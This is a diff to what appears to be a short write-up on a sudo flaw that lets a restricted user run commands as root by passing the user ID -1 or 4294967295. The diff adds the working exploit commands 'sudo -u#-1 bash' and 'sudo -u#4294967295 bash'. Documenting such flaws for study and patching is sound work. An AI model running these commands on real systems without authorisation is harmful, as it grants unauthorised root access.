@@ -15,7 +15,7 @@ bypass this security policy and take complete control over the system.
 ```
 An Apple Information Security Researcher by Joe Vennix
 ```
-## Identify an Attack.
+## How to Identify this Attack.
 If you have Permission to see sudoers file then,
 ```
 if /etc/sudoers Conf file Says, 
@@ -37,7 +37,11 @@ User lucy may run the following commands on this host:
 ```
 The flaw can be exploited by an attacker to run commands as root by specifying the user ID "-1" or "4294967295."  
 ```
-
+Run the below command as 
+```
+sudo -u#-1 bash
+sudo -u#4294967295 bash 
+```
 ## Didn't work, When i used /usr/bin/bash to execute eccept root
 
 ```
